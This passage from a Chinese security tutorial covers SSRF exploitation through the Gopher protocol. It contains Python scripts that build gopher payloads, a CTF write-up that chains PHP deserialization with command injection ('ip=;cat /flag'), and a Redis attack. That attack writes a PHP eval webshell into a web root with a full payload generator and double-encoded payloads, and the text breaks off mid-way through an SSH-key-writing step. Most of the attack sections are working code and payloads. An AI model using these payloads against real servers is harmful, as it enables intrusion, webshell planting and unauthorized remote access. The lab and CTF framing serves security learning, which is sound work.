title=\"常见攻击方式（Gopher协议）\"></a>常见攻击方式（Gopher协议）</h2><h3 id=\"Gopher协议在SSRF中的利用\"><a href=\"#Gopher协议在SSRF中的利用\" class=\"headerlink\" title=\"Gopher协议在SSRF中的利用\"></a>Gopher协议在SSRF中的利用</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。</p>\n<p>现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p>\n<p><strong>（1）Gopher协议格式</strong></p>\n<p>URL: gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_后接TCP数据流  </p>\n<p># 注意不要忘记后面那个下划线”_“，下划线”_“后面才开始接TCP数据流，如果不加这个”_“，那么服务端收到的消息将不是完整的，该字符可随意写。</p>\n<ul>\n<li><p>gopher的默认端口是70</p>\n</li>\n<li><p>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</p>\n</li>\n</ul>\n<blockquote>\n<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p>\n<ol>\n<li><p>抓取或构造HTTP数据包</p>\n</li>\n<li><p>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code></p>\n</li>\n<li><p>发送符合gopher协议格式的请求</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_GET\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br></pre></td></tr></table></figure>\n\n<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse  </span><br><span class=\"line\">payload =\\\\  </span><br><span class=\"line\">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72  </span><br><span class=\"line\">&quot;&quot;&quot;    </span><br></pre></td></tr></table></figure>\n\n<p># 注意后面一定要有回车，回车结尾表示http请求结束  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)  </span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)  </span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new  </span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small\"\n                        alt=\"image-20210113170748727\"\n                 ></p>\n<blockquote>\n<p><strong>注意这几个问题：</strong></p>\n<ol>\n<li><p>问号（?）需要转码为URL编码，也就是%3f</p>\n</li>\n<li><p>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</p>\n</li>\n<li><p>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>\n</li>\n</ol>\n</blockquote>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg\"\n                        alt=\"image-20210113171043970\"\n                 ></p>\n<p>如上图，成功用GET方法传参并输出“Hello Bunny”。</p>\n<p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p>\n<p>测试代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_POST\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p>\n<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">payload =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"注意后面一定要有回车，回车结尾表示http请求结束\"><a href=\"#注意后面一定要有回车，回车结尾表示http请求结束\" class=\"headerlink\" title=\"注意后面一定要有回车，回车结尾表示http请求结束\"></a>注意后面一定要有回车，回车结尾表示http请求结束</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg\"\n                        alt=\"image-20210113171513366\"\n                 ></p>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small\"\n                        alt=\"image-20210113171641047\"\n                 ></p>\n<p>如上图，成功用POST方法传参并输出“Hello Bunny”。</p>\n<p><strong>[2020 科来杯初赛]Web1</strong>这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。</p>\n<h3 id=\"2020-科来杯初赛-Web1\"><a href=\"#2020-科来杯初赛-Web1\" class=\"headerlink\" title=\"[2020 科来杯初赛]Web1\"></a>[2020 科来杯初赛]Web1</h3><p>进入题目后即给处源码：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg\"\n                        alt=\"image-20200921134331679\"\n                 ></p>\n<p>这里很明显就是一个SSRF，url过滤了<code>file</code>、<code>ftp</code>，但是必须要包含<code>127.0.0.1</code>。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Welcome &#123;  </span><br><span class=\"line\">protected $url = &quot;http://127.0.0.1/tool.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$poc = new Welcome;  </span><br><span class=\"line\">//echo serialize($poc);  </span><br><span class=\"line\">echo urlencode(serialize($poc));  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>生成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">// O:7:&quot;Welcome&quot;:1:&#123;s:6:&quot;\\*url&quot;;s:25:&quot;http://127.0.0.1/tool.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将Welcome后面表示对象属性个数的“1”改为“2”即可绕过<code>__destruct()</code>的限制。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small\"\n                        alt=\"image-20200921134812338\"\n                 ></p>\n<p>读出来tool.php的源码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#tool.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error\\_reporting(0);</span><br><span class=\"line\">$respect\\_show\\_ping = function($params) &#123;</span><br><span class=\"line\">   extract($params);</span><br><span class=\"line\">   $ip = isset($ip) ? $ip :&#x27;127.0.0.1&#x27;;</span><br><span class=\"line\">   system(&#x27;ping -c 1 &#x27;.$ip);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">if ($\\_SERVER\\[&quot;REMOTE\\_ADDR&quot;\\] !== &quot;127.0.0.1&quot;)&#123;</span><br><span class=\"line\">   echo &#x27;&lt;h2&gt;Not localhost!&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">   highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">   $respect\\_show\\_ping($\\_POST);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可知tool.php页面存在命令执行漏洞。当REMOTE_ADDR为127.0.0.1时才可执行命令。REMOTE_ADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。</p>\n<p>既然这里要求当REMOTE_ADDR为127.0.0.1时才可执行命令，且REMOTE_ADDR的值是不可以伪造的，我们要想让REMOTE_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。</p>\n<p>我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE_ADDR的值也就是127.0.0.1了。</p>\n<p>SSRF，利用gopher发POST包，进行命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">test =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /tool.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\"></span><br><span class=\"line\">ip=;cat /flag</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n<p>#注意后面一定要有回车，回车结尾表示http请求结束</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(test)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p>这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。</p>\n<p>生成gopher协议格式的payload为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p>然后构造反序列化exp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Welcome &#123;</span><br><span class=\"line\">    protected $url = &quot;gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$poc = new Welcome;</span><br><span class=\"line\">//echo serialize($poc);</span><br><span class=\"line\">echo urlencode(serialize($poc));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>生成payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>同样将Welcome后面表示对象属性个数的“1”改为“2”绕过<code>__destruct()</code>的限制后执行：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg\"\n                        alt=\"image-20200921135622488\"\n                 ></p>\n<p>如上图，命令执行成功。</p>\n<p><strong>注意：</strong>这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"攻击内网Redis\"><a href=\"#攻击内网Redis\" class=\"headerlink\" title=\"攻击内网Redis\"></a>攻击内网Redis</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small\"\n                        alt=\"20210113151633.png\"\n                 ></p>\n<p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>\n<blockquote>\n<p><strong>什么是Redis未授权访问？</strong></p>\n<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>\n<p>简单说，漏洞的产生条件有以下两点：</p>\n<ul>\n<li><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p>\n</li>\n<li><p>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>\n</li>\n</ul>\n</blockquote>\n<p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>\n<p>下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg\"\n                        alt=\"image-20210113190430425\"\n                 ></p>\n<p>在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。</p>\n<h3 id=\"绝对路径写WebShell\"><a href=\"#绝对路径写WebShell\" class=\"headerlink\" title=\"绝对路径写WebShell\"></a>绝对路径写WebShell</h3><p>首先构造redis命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;&lt;?php eval($\\_POST\\[&quot;whoami&quot;\\]);?&gt;&#x27;  </span><br><span class=\"line\">config set dir /var/www/html  </span><br><span class=\"line\">config set dbfilename shell.php  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">shell=&quot;\\\\n\\\\n&lt;?php eval($\\_POST\\[\\\\&quot;whoami\\\\&quot;\\]);?&gt;\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;shell.php&quot;</span><br><span class=\"line\">path=&quot;/var/www/html&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>执行后生成paylaod如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg\"\n                        alt=\"image-20210113175116867\"\n                 ></p>\n<p>这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>如下所示，成功在主机192.168.52.131上面写入WebShell：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small\"\n                        alt=\"image-20210113185919592\"\n                 ></p>\n<h3 id=\"写SSH公钥\"><a href=\"#写SSH公钥\" class=\"headerlink\" title=\"写SSH公钥\"></a>写SSH公钥</h3><p>同样，我们也可以直接这个存在Redis未授权的主机的<del>&#x2F;.ssh目录下写入SSH公钥，直接实现免密登录，但前提是</del>&#x2F;.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。</p>\n<p>构造redis命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;ssh-rsa 